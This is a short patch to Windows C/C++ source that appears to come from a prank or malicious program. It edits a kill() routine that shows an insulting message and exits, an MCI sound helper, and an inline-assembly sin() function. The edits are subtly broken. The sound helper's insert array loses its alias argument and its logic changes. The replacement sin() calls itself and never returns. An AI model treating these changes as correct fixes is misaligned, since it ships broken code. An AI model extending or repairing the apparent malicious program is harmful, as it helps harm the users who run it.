@@ -9,7 +9,7 @@ BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
 }
 
 void kill() {
-	CreateThread(NULL, 0, &messageThread, L"REST IN PISS, FOREVER MISS!", 0, NULL);
+	CreateThread(NULL, 0, &messageThread, (void*)L"REST IN PISS, FOREVER MISS!", 0, NULL);
 	Sleep(4000);
 	ExitProcess(0);
 }
@@ -95,7 +95,7 @@ MCIERROR playSound(LPWSTR alias, BOOL async) {
 	MCIERROR err = resetSound(alias);
 	if (err) return err;
 
-	LPWSTR inserts[] = { alias, async ? L"" : L" wait" };
+	LPWSTR inserts[] = { (alias && async) ? (wchar_t*)L"" : (wchar_t*)L" wait" };
 
 	LPWSTR cmd;
 	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
@@ -169,8 +169,5 @@ void memSet(VOID *ptr, char value, int count) {
 extern "C" { int _fltused; }
 
 float sin(float x) {
-	__asm {
-		fld x
-		fsin
-	}
+	return sin(x);
 }
